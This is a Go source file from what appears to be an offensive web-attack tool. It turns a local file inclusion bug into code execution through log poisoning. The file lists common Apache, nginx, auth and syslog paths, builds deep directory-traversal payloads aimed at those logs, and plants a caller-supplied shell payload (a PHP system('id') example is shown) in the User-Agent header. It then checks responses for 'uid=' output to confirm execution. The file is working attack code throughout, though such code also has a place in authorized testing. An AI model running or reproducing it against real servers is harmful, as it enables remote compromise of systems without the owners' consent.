package engine

import (
	"strings"
)

// CommonLogPaths contains a list of frequently accessible log files on Linux systems.
var CommonLogPaths = []string{
	"/var/log/apache2/access.log",
	"/var/log/apache2/error.log",
	"/var/log/httpd/access_log",
	"/var/log/httpd/error_log",
	"/var/log/nginx/access.log",
	"/var/log/nginx/error.log",
	"/var/log/auth.log",
	"/var/log/syslog",
}

// PoisonTask generates a poisoning request for a given log path.
func PoisonTask(task Task, logPath, shellPayload string) Task {
	// Create a copy of the task
	pTask := task

	// Create the LFI payload for the log path
	// Assuming the original payload was something like ../../../etc/passwd
	// We need to replace /etc/passwd with the logPath

	// Better way: use a base traversal if we can determine it,
	// or just prepend traversal based on nesting.
	// For now, let's use a standard deep traversal.
	traversal := "../../../../../../../../../../../.."
	pTask.Payload = traversal + logPath

	// Reconstruct URL with the new payload
	// This is a bit simplified, ideally we would use the same logic as GenerateTasks
	// Reconstruct URL with the new payload
	pTask.URL = strings.ReplaceAll(pTask.URL, task.Payload, pTask.Payload)

	// The "Poisoning" part: Injecting shell into a header that is typically logged
	if pTask.Headers == nil {
		pTask.Headers = make(map[string]string)
	}
	pTask.Headers["User-Agent"] = shellPayload

	return pTask
}

// CheckPoisonSuccess checks if the shell payload was successfully executed.
// It looks for evidence of execution in the response body.
func CheckPoisonSuccess(body, shellPayload string) bool {
	// If the shell payload was <?php system('id'); ?>, we look for root:x:0:0 or similar.
	// However, usually we inject a "canary" to verify execution.
	// For this implementation, we will look for specific markers if the user provided a complex shell.

	// If it's a simple 'id' command output:
	if strings.Contains(body, "uid=0(root)") || strings.Contains(body, "uid=") {
		return true
	}

	// If it's a generic PHP system call output, we might look for common command outputs.
	return false
}
